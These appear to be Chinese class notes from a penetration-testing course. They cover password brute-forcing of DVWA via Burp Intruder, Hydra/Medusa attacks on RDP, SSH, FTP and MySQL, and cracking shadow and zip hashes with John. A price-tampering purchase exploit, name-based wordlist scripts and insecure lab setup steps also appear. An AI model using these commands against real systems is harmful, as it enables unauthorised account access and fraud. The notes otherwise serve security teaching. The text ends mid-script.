  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230803220339023.png" alt="image-20230803220339023" style="zoom:50%;" />


### medium

* 调为medium级别，点击查看源代码，发现只是多了sleep(2),最后跳转页面时休眠两秒钟,依然可以爆破，只是增加了爆破的时间，操作同low级别。

### high

* 增加了token

  > token机流程
  >
  > 1. 客户端使用用户名和密码请求登录。
  >
  > 2. 服务端收到请求，验证用户名和密码。
  >
  > 3. 验证成功后，服务端会生成一个token，然后把这个token发送给客户端。
  >
  > 4. 客户端收到token后把它存储起来，可以放在cookie或者Local Storage（本地存储）里。
  >
  > 5. 客户端每次向服务端发送请求的时候都需要带上服务端发给的token。
  >
  > 6. 服务端收到请求，然后去验证客户端请求里面带着token，如果验证成功，就向客户端返回请求的数据。
  >
  > **每次刷新页面都会产生新的token**

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808092838484.png" alt="image-20230808092838484" style="zoom:67%;" />

* 进入登陆界面，开启拦截，输入账号（已知）密码（随便输）登录

  ![image-20230807221836764](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807221836764.png)

* 弹出拦截框，发送到intruder

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807221926725.png" alt="image-20230807221926725" style="zoom:67%;" />

* 只选中password和token

  ![image-20230807222022970](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807222022970.png)

* 攻击模式调为pitchfork模式

  ![image-20230807222101414](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807222101414.png)

* 在grep-Extract下点击add

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807222537455.png" alt="image-20230807222537455" style="zoom:67%;" />

* 点击fetch response

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807222603166.png" alt="image-20230807222603166" style="zoom:67%;" />

* 复制引号中的内容并点击ok

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807222714588.png" alt="image-20230807222714588" style="zoom:67%;" />

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807223059103.png" alt="image-20230807223059103" style="zoom:67%;" />

  

* payload1设置为simple list并导入密码字典

  ![image-20230807222312356](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807222312356.png)

* payload2设置为Recursive grep（正则表达式，可以过滤字符），将复制的token粘贴到Payload Options下的Initial payload for first request中

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807223413323.png" alt="image-20230807223413323" style="zoom:67%;" />

* 设置单线程攻击（high模式防止暴力破解禁止多线程，一个token值只能用于一次登录）

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807223550617.png" alt="image-20230807223550617" style="zoom:67%;" />

* 开始攻击

  成功爆破密码

  ![image-20230807224026173](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807224026173.png)

  

### 提高爆破速度

> 1. 增加线程数：在Burp Suite中，可以调整并发线程数来提高爆破速度。在“Intruder”选项卡中的“Options”选项中，将“Number of threads”（线程数）增加到较高的值，例如10或20。（low、medium）
> 2. 优化字典：使用更小且更精确的字典可以减少爆破的尝试次数，从而提高速度。可以尝试使用更精简的字典，或者根据目标系统的特点自定义字典。
> 3. 减少超时时间：在“Intruder”选项卡中的“Options”选项中，将“Payload processing timeout”（负载处理超时时间）设置为较低的值。这样可以减少每个尝试的等待时间，从而提高速度。
> 4. 使用分布式爆破：如果目标系统较为复杂或需要大量尝试，可以考虑使用多个Burp Suite实例进行分布式爆破。每个实例可以负责一部分尝试，从而提高整体速度。







# burpsuite的四种爆破模式

1. Sinper（狙击手）

   * sinper使用一个字典，主要是将标记的数据进行逐个遍历替换

   * 爆破次数=标记字段数*字典字段数量

   ```
   例
   标记了三处，字典为：
   111
   222
   333
   444
   555
   最终爆破次数为3*5=15，如下
   111、*、*，222、*、*，...
   *、111、*，*、222、*，...
   ...
   ...
   ...
   ```

   

2. Battering ram（攻城槌）：

   * Battering ram使用一个字典，将包内所有标记的数据进行同时替换再发出

   * 爆破次数=字典字段数量

   ```
   例
   标记3个字段，使用同一字典，每次替换全部标记字段
   111
   222
   333
   444
   555
   最终5个爆破次数为5次，分别为：
   111、111、111，222、222、222，333、333、333，444、444、444，555、555、555
   ```

3. Pitchfork（干草叉）：

   * Pitchfork对每个标记字段单独设置字典，按照一一对应的关系取最少的组合

   * 爆破次数=最少的字段字段数

   ```
   例
   标记三处
   第一处设置字典为：
   123
   456
   789
   111
   222
   333
   第二处设置字典为：
   aaa
   bbb
   ccc
   ddd
   eee
   第三处设置字典为：
   AAA
   BBB
   爆破次数为2次，分别为：123、aaa、AAA，456、bbb、BBB
   ```

4. Cluster bomb（集束炸弹）：

   * Cluster bomb使用穷举法，对每个标记字段都遍历字典

   * 标记三处，第一处字典3个，第二处字典2个，第三处字典3个，爆破次数：3*2*3

   ```
   例
   第一处字典
   111
   222
   333
   第二处字典：
   aaa
   bbb
   第三处字典：
   AAA
   BBB
   CCC
   最终爆破次数为3*2*3=18次
   ```






# 远程桌面RDP密码的暴力破解

* Win7（防火墙关闭）

* 远程桌面（**rdp**协议）

* 远程桌面服务监听端口**3389**

* 攻击工具：九头蛇hydra

* kali

  ```
  hydra 被攻击IP rdp -l <用户名> -P 密码字典 -V
  hydra 192.168.86.135 rdp -l test -P top1000.txt
  hydra 192.168.86.135 rdp -L name.txt -P top1000.txt
  ::若用户名未知可更改命令额外爆破用户名
  ::l和p如果大写，后面跟密码字典或用户名字典，小写则后面跟一个用户名或密码
  ::-V显示细节
  ::-f一旦爆破成功一个就立即停止爆破
  ```
  
  ![image-20230804170120395](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804170120395.png)
  
  ![image-20230804170141269](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804170141269.png)



# RDP远程桌面和Telnet协议

> RDP（远程桌面协议）和Telnet是两种不同的远程访问协议，它们有以下区别：
>
> 1. 安全性：RDP提供了加密的远程连接，可以保护数据的安全性，而Telnet是明文传输，不提供加密功能，容易被黑客拦截并窃取敏感信息。
> 2. 功能：RDP是一种图形化的协议，可以远程控制桌面，支持复制粘贴、文件传输等功能；而Telnet是一种基于文本的协议，主要用于远程登录和命令行操作，不支持图形化界面。
> 3. 端口：RDP使用3389端口进行通信，而Telnet使用23端口进行通信。
> 4. 操作系统支持：RDP是由Microsoft开发的协议，主要用于Windows操作系统；而Telnet是一种跨平台的协议，可以在多种操作系统上使用。
>
> 综上所述，RDP相对于Telnet来说更安全、功能更强大，适用于远程控制桌面；而Telnet则更适合用于远程登录和命令行操作。





# 数据库

* MySQL数据库连接端口一般为**3306**端口

## 本地登录

* 登录mysql

  在mysql的bin目录下打开cmd，输入以下指令

  ```
  mysql.exe -uroot -p
  ```

  然后输入密码登陆成功

## 开启远程登陆

#### 8.0数据库

* 登录数据库，输入以下指令

  ```
  use mysql
  ```

* 更新域属性，'%'表示允许任意IP地址访问

  ```
  update user set host='%' where user ='root';
  ```

* 执行以上语句之后再执行：

  ```
  FLUSH PRIVILEGES;
  ```

* 再执行授权语句：

  ```
  GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'WITH GRANT OPTION;
  ```

#### 5.0数据库

* ```
  GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;
  #第一个*所有的数据库都可访问
  #第二个*所有的表都可访问
  #@%代表所有的主机（IP）都可访问
  #用户名root密码123456
  ```

* 更新权限

  ```
  FLUSH PRIVILEGES;
  ```

  



## 添加mysql到环境变量

* 如果不添加直接启动

  ![image-20230808144012599](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808144012599.png)

* 右键计算机属性

  ![image-20230808143315203](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808143315203.png)

* 高级系统设置

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808143337171.png" alt="image-20230808143337171" style="zoom:67%;" />

* 环境变量

  ![image-20230808143358355](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808143358355.png)

* 在系统环境变量中编辑Path

  ![image-20230808143613983](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808143613983.png)

* 先输入分号(英文分号)，再将MySQL的bin文件目录粘贴到后面（包括bin）

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808143845876.png" alt="image-20230808143845876" style="zoom: 67%;" />

* 点击确定，Win+R打开cmd即可登录mysql
* 配置完成

## 数据库使用

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808144110917.png" alt="image-20230808144110917" style="zoom:67%;" />

* 查看数据库

  ```
  show databases;
  ```

* 查看指定数据库

  ```
  show create database <数据库>;
  ```

* 查看表

  ```
  show tables；
  ```

* 查看表结构

  ```
  desc 表名；
  ```

* 查看字段

  ```
  describe <字段>；
  ```

* 退出数据库

  ```
  exit
  ```

* 启动phpstudy(自带Mysql)

# 数据库密码爆破

### 本地爆破

* 在九头蛇目录处输入开启cmd

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804203846997.png" alt="image-20230804203846997" style="zoom: 50%;" />

  ![image-20230804204007033](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230804204007033.png)

* 输入爆破指令

  ```
  hydra.exe -l root -P 密码字典 mysql://127.0.0.1
  ```

  ![image-20230808142552411](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808142552411.png)

  ![image-20230808161046213](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808161046213.png)

* mysql8.0本地爆破失败，使用kali可以爆破





### 使用kali远程爆破数据库密码

```
hydra -l <用户名> -P 密码字典 mysql://IP
```

![image-20230808152450076](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808152450076.png)









# CentOS7的安装

* 红帽系列

* 目前许多linux服务器使用该系统

* 安装过程

  * 新建虚拟机

  * 选择Linux>CentOS 7 64位

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808164100715.png" alt="image-20230808164100715" style="zoom:67%;" />

  * 选择安装路径

  * 给60G硬盘（自选）

  * 移除打印机

  * 分配内存2G（自选）

  * 选择CentOS7镜像文件

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808164342974.png" alt="image-20230808164342974" style="zoom: 50%;" />

  * 选择Install CesnOS7

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808164432339.png" alt="image-20230808164432339" style="zoom: 50%;" />

  * 选择简体中文

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808164522733.png" alt="image-20230808164522733" style="zoom:67%;" />

  * 点击安装位置

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808164554345.png" alt="image-20230808164554345" style="zoom:67%;" />

  * 点击完成

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808164614263.png" alt="image-20230808164614263" style="zoom:67%;" />

  * 点击软件选择

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808165004690.png" alt="image-20230808165004690" style="zoom:67%;" />

  * 将开发工具勾选上，点击完成

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808165138658.png" alt="image-20230808165138658" style="zoom: 67%;" />

  * 点击开始安装

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808165226765.png" alt="image-20230808165226765" style="zoom:67%;" />

  * 设置root密码（123456），点击完成

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808165257048.png" alt="image-20230808165257048" style="zoom:67%;" />

  * 安装图形化界面占用系统资源，很少linux服务器使用图形化界面

  * 安装完成后重启

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808170732194.png" alt="image-20230808170732194" style="zoom:67%;" />

  * 输入账号（root管理员）密码登录

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808170856023.png" alt="image-20230808170856023"  />

  * 输入账号密码后需要远程登陆进行配置

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808171235053.png" alt="image-20230808171235053"  />

  * `ip -a`查看IP

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808171304539.png" alt="image-20230808171304539" style="zoom:80%;" />

    未获取到IP

  * 进入目录

    `cd /etc/sysconfig/network-scripts/`

    ![image-20230808171436571](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808171436571.png)

  * 编辑此配置文件

    `vi ifcfg-ens33`

    ![image-20230808171657158](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808171657158.png)

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808171912386.png" alt="image-20230808171912386" style="zoom: 50%;" />

    将ONBOOT=no改成yes

    按下esc  输入`:wq`按下回车保存并退出

  * 重启网卡服务

    ```
    systemctl restart network
    ```

  * 重新查看ip地址

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808172539500.png" alt="image-20230808172539500" style="zoom:67%;" />

  * 使用ssh远程登录Linux

    ```
    ssh 用户名@IP -p <端口号>
    ssh root@192.168.144.144
    输入密码
    ```

  * 登陆成功，可远程控制

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808174721843.png" alt="image-20230808174721843" style="zoom:67%;" />

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230808174850785.png" alt="image-20230808174850785" style="zoom:67%;" />

# ssh密码爆破

```
hydra -l <用户名> -P 密码字典 ssh://IP -s 端口号
```





# ==第八天笔记==





# FinalShell（ssh客户端）

* 使用方法

  * 新建ssh连接

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809101429342.png" alt="image-20230809101429342" style="zoom:67%;" />

  * 输入主机名称、IP、用户名、密码点击确定登录

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809101704494.png" alt="image-20230809101704494" style="zoom:67%;" />

  * 找到刚刚设置的机器，双击进入

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809102128106.png" alt="image-20230809102128106" style="zoom:67%;" />

  * 点击接受并保存

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809102210325.png" alt="image-20230809102210325" style="zoom:67%;" />

  * 成功连接

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809102230276.png" alt="image-20230809102230276" style="zoom:50%;" />

* linux基本命令

  * 修改主机名并重启

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809102500418.png" alt="image-20230809102500418" style="zoom:50%;" />

  * 等待重启完成再次点击连接发现主机名已被更改

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809102602514.png" alt="image-20230809102602514" style="zoom:67%;" />

  * 修改ssh默认端口

    ```
    vi /etc/ssh/sshd_config
    ```

    找到port，更改端口号并把#去掉

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809103029840.png" alt="image-20230809103029840" style="zoom:67%;" />

    ![image-20230809103101707](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809103101707.png)

    保存并推出vi

    更改端口后不会立刻断开连接，重启生效

  * 重启sshd服务后端口改变

    ```
    systemctl restart sshd
    ```

    ![image-20230809103317018](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809103317018.png)

    报错，需更改设置

    关闭文件防火墙，编辑文件将enforcing改为disabled

    ```
    vi /etc/selinux/config
    ```

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809103629890.png" alt="image-20230809103629890" style="zoom:67%;" />

    查看sshd状态

    ```
    systemctl status sshd
    ```

    再次登录需要更改端口

  * 此时端口被改变，需要重设置更改端口号

    再次点击连接，提示连接失败

    <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809104044299.png" alt="image-20230809104044299" style="zoom:67%;" />

    到CentOS7主机上（本地）关闭防火墙

    ```
    systemctl stop firewalld
    #开启重启还会开启防火墙
    systemctl disable firewalld
    #永久关闭（开机不自启）
    ```
  
    
  
    ![ch](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809105300174.png)
  
    
  
    重新连接
  
  * 查看ssh状态
  
    ```
    systemctl status sshd
    ```
  
    ![image-20230809143105580](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809143105580.png)
  
    
  

# 爆破ssh

## hydra

```
hydra -l <用户名> -P 密码字典 ssh://IP -s <端口号> -V
#使用默认端口号可以不加-s
hydra -l root -P top1000-1.txt ssh://192.168.191.172 -s 8888 -V
```

![image-20230809144531039](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809144531039.png)

## medusa

```
medusa -M ssh -h 192.168.191.172 -u root -P top1000-1.txt -t 5 -n 8888
-n 加非默认端口号
```











# Ftp密码爆破

## hydra

```
hydra -l <用户名> -P 密码字典 ftp://IP -s <端口号> -V
#使用默认端口号可以不加-s
hydra -l root -P top1000-1.txt ftp://192.168.191.172 -s 8888 -V
```

## medusa

```
medusa -M ftp -h 目标IP -u 用户名 -P /root/Desktop/top1000.txt
```









# medusa

* mysql、vnc、SMB、telnet、FTP、ssh

  若设置的线程过大会爆error

* 默认线程很少，爆破速度慢，爆破时手动设置线程

* 使用方法

  ```
  medusha  [-h host|-H file] [-u username | -U file] [-p password | -P file] [-C file] -M modudle [OPT]
  ```

* |   参数名   |                     参数含义                      |
  | :--------: | :-----------------------------------------------: |
  |     -h     |              目标主机名称或是IP地址               |
  |     -H     |           包含多个IP地址的文件绝对路径            |
  |     -u     |                    测试用户名                     |
  |     -U     |           包含测试用户名的文件绝对路径            |
  |     -p     |                  测试用户名密码                   |
  |     -P     |         包含测试用户名密码的文件绝对路径          |
  |     -C     |              组合条目文件的绝对路径               |
  |     -O     |              日志信息文件的绝对路径               |
  | -e[n/s/ns] |       n代表空密码，s代表为密码与用户名相同        |
  |     -M     |                   模块执行mingc                   |
  |     -m     |                  传递参数到模块                   |
  |     -d     |                 显示所有模块名称                  |
  |     -n     |               使用**非默认**TCP端口               |
  |     -s     |                      启用ssl                      |
  |     -r     |                 重试时间，默认3秒                 |
  |     -t     |                   设定线程数量                    |
  |     -T     |                同时测试的主机总数                 |
  |     -L     |           并行化，每个用户使用一个线程            |
  |     -f     |    在任何主机上找到第一个账号/密码后，停止破解    |
  |     -F     | 在任何主机上找到第一个有效的用户名/密码后停止审计 |
  |     -q     |                显示模块的使用信息                 |
  |     -v     |                  详细级别（0-6）                  |
  |     -w     |               错误调试级别（0-10）                |
  |     -V     |                     显示版本                      |
  |     -Z     |                恢复之前终端的扫描                 |



# /etc/passwd文件和/etc/shadow文件

* 存放口令、登陆密码（加密存储）

* 通过80端口渗透金linux后看见root用户密码（加密）

* /etc/passwd 和 /etc/shadow文件

* /etc/passwd（存放用户名和其他信息）

  ![image-20230806141257151](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806141257151.png)

  冒号隔开

  |  root  |  x   |   0    |  0   | root | /root  |             /user/bin/zsh(或/usr/sbin/nologin)              |
  | :----: | :--: | :----: | :--: | :--: | :----: | :---------------------------------------------------------: |
  | 用户名 | 口令 | 用户id | 组id | 备注 | 家目录 | 登录shell/命令解释器（命令或 shell (/bin/bash) 的绝对路径） |

* 超级管理员UID=0，系统用户uid1-999，普通用户uid1000以后

* /etc/shadow（存放加密过的密码）

  ![image-20230806142407053](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806142407053.png)

  ```
  root:$y$j9T$jOd7E6DLFdmgM3x6gciyA/$KHsDhTVufiVEc0ACIUAcrk9N8pPJpYv5ZGPOMtI3mY9:19404:0:99999:7:::
  #用户名:!!代表这个用户没有密码
  #用户名:*代表这个用户的密码是被锁定的
  ```

  |  root  | $y$j9T~3mY9  |                19404                 |          0           |            99999            |            7             |                      |              |          |
  | :----: | :----------: | :----------------------------------: | :------------------: | :-------------------------: | :----------------------: | :------------------: | ------------ | -------- |
  | 用户名 | 加密后的密码 | 上次密码修改日期（距1970.1.1多少天） | 最小修改密码时间间隔 | 密码的有效期（99999不到期） | 密码需要变更前的警告天数 | 密码过期后的宽限天数 | 账号失效时间 | 保留参数 |
  
  显示出具体日期

  ```
  date -d "1970-01-01 <数字> days"
  ```
  
  

  

  ## John解密shadow口令

  口令

  ```
  $y$j9T$jOd7E6DLFdmgM3x6gciyA/$KHsDhTVufiVEc0ACIUAcrk9N8pPJpYv5ZGPOMtI3mY9
  #$y$表示使用yescrypt的加密方式（暂时无法破解）
  ```
  
  ```
  hdl:$1$xGzfpXGo$QpdNja/kIcQD704l00pPh.: 18977:0:99999:7
  #$1$表示使用md5加密方式加密
  ```
  
  将**加密后的密码字段**复制到一个文件里（随便取，此处取名为shadow）

  使用

  ```
  john shadow
  ```
  
  出现警告

  > Using default input encoding: UTF-8
  > No password hashes loaded (see FAQ)
  
  ![image-20230806150227316](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806150227316.png)

  解决方法：在后面加上--format=crypt

  ```
  john shadow --format=crypt
  # 解密DES、MD5、Blowfish时加--format=crypt
  ```
  
  成功爆破密码

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806151305939.png" alt="image-20230806151305939" style="zoom:67%;" />

  如再次爆破则警告

  > Using default input encoding: UTF-8
  > Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
  > No password hashes left to crack (see FAQ)
  
  ![image-20230806150257849](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806150257849.png)

  * 提示我们没有密码哈希可以破解。因为我们已经对该文件爆破过，则不会进行二次爆破，可以通过命令来查看已经爆破出来的密码。

    ```
    john shadow --show
    ```
  
    ![image-20230806150814654](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806150814654.png)

  * ***或者清除缓存***

    找到.john文件

    ```
    ls -la
    ```
  
    ![image-20230809160120168](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230809160120168.png)

    删除该文件

    ```
    rm -rf .john
    ```
  
    




# ==第九天笔记==





# 压缩包密码的破解

* Linux压缩文件

  进入文件目录

  ```
  zip 压缩后的文件名 压缩前的文件名
  zip abc.zip abc.txt
  ```

  ```
  tar zcvf 压缩后的文件名 压缩前的文件名
  tar zcvf abc.tar abc.txt
  #z:以gzip格式压缩
  #c:创建
  #v:显示压缩过程
  #f:指定文件
  ```

* 解压

  ```
  unzip abc.zip -d /
  #-d：指定解压路径 
  #/：到根目录
  #解压zip压缩文件
  ```

  ```
  tar xvf abc.tar
  x:解压 abc.tar
  C：指定到解压位置
  #解压tar文件
  ```

* kali直接解压加密的压缩文件需要输入密码

  ![image-20230806214616422](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806214616422.png)

* 破解密码

  1. ```
     zip2john 压缩文件 > mima.txt
     #将压缩文件的哈希值写入mima.txt
     ```

  2. ```
     john mima.txt
     ```

     ![image-20230806215127415](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806215127415.png)

  3. 再次解压，输入密码

     解压成功

     ![image-20230806215411391](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230806215411391.png)
  
  4. 解压加密的a.zip
  
     ![image-20230810093412043](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230810093412043.png)
  
     ![image-20230810094607628](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230810094607628.png)
  
     **使用传统加密**
  
     





# 逻辑漏洞

* 无法通过扫描发现



## 网购逻辑（防范修改金额）

<img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230810110318537.png" alt="image-20230810110318537" style="zoom: 50%;" />



## 越权修改

* 扫描出后台网站登录

* 防范

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230810110745786.png" alt="image-20230810110745786" style="zoom: 67%;" />





## 验证码回传获取

* 抓包 
* 防范思路
  * 服务器后台验证验证码
  * 对返回的验证码进行加密处理



## 接口无限制枚举

* 登陆账号或密码无限制尝试枚举
* 验证码的无限制枚举
* 注册用户信息无限制枚举



* 预防措施
  * 加入token验证
  * 加入验证码验证





# 一分钱购买商品

==网站未对传入的金额等信息进行审核==

* 搭建购物网站

* Win7虚拟机中，复制网站文件到phpstudy的www目录下并将网站文件夹改名为shop

* 启动phpstudy

* 访问shop网站IP/shop

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807113935384.png" alt="image-20230807113935384" style="zoom:67%;" />

  网站部署成功

* 打开kali的burpsuite

* 开启浏览器，打开代理

* 进入shop网站，进入购物车点击结算

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807114531418.png" alt="image-20230807114531418" style="zoom: 33%;" />

  弹出付款的金额

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807114548742.png" alt="image-20230807114548742" style="zoom:80%;" />

  

* 开启burp suite的拦截

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807114306872.png" alt="image-20230807114306872" style="zoom: 50%;" />

* 点击结算，弹出拦截框

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807114808968.png" alt="image-20230807114808968" style="zoom:67%;" />

  将付款金额修改为0.01并点击forward放行

  <img src="./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807114909135.png" alt="image-20230807114909135" style="zoom: 50%;" />

* 提示一分钱购买成功

  ![image-20230807115000893](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230807115000893.png)







# Python拼接姓名加弱密码



* 拼接用户名加已有密码字典

  ```python
  with open("<密码字典>","r") as f:    #"r"文件读操作，f为参数可以随便设置
      pdstr = f.readlines()            #逐条读取文本
  #with open打开文件后无需关闭
  pdname = "zc"
  newpdlist = []                       #新建列表
  for each in pdstr :                        
      newpdstr = pdname+each.strip()   #循环逐条打印拼接后的字符串,.strip()去掉换行符
      newpdlist.append(newstr)
  with open("<文件名>"，"w") as f:      #"w"文件写操作
      f.writelines(newpdlist)
  ```

  ```python
  with open(r"E:\.tools_attack\hydra\top1000.txt","r") as f :
      p = f.readlines()
  pdname = "zc"
  newpdlist = []
  for each in p :
      newpdstr = pdname + each         #或者newpdstr = pdname+each.strip()
      newpdlist.append(newpdstr)       #newpdlist.append(newpdstr + "\n")
  with open(r"C:\Users\LEGION\Desktop\mima.txt","w") as f :
      f.writelines(newpdlist)
  #指定文件路径前要加r
  ```

* 姓名后面+1~9999数字

  ```python
  n = []
  for i in range(1,10000) :        #左闭右开
      m = "zc" + str(i)
      n.append(m+"\n")
  with open(r"C:\Users\LEGION\Desktop\mima.txt","w") as f :
      f.writelines(n)
  ```

  

* time.sleep

  ```python
  import time
  time.sleep(秒数)
  ```

* 数字1~9999加输入的姓名

  在桌面创建一个mima.txt文档并将生成的密码写入

  并显示在控制台上停留3秒

  ```python
  import time
  n = []
  name = input("请输入姓名：")
  for i in range(1,10000) :
      m = str(i) + name
      n.append(m+"\n")
      print(m+"\n")
  with open(r"C:\Users\LEGION\Desktop\mima.txt","w") as f :
      f.writelines(n)
  time.sleep(3)
  ```

  实现效果

  ![image-20230810162902640](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230810162902640.png)

  ![image-20230810162913570](./%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/image-20230810162913570.png)





* 乱序姓名

  输入三个字母，输出三个字母的随机组合（不重复）

  循环嵌套

  ```python
  n=["g","j","l"]
  for i in n :
      for j in n :
          for k in n :
              if i==j or i == k or j == k :
                  pass    #不进行操作
              else :
                  print(i + j + k)
  ```

  

* 输入姓名

  乱序姓名+1~9999

  并建立mima.txt到桌面并输入密码本

  ```python
  name = input("请输入姓名：")
  namelist = []
  passwd = []
  passwdlist = []
  for i in name :
      namelist.append(i)
  for n1 in namelist :
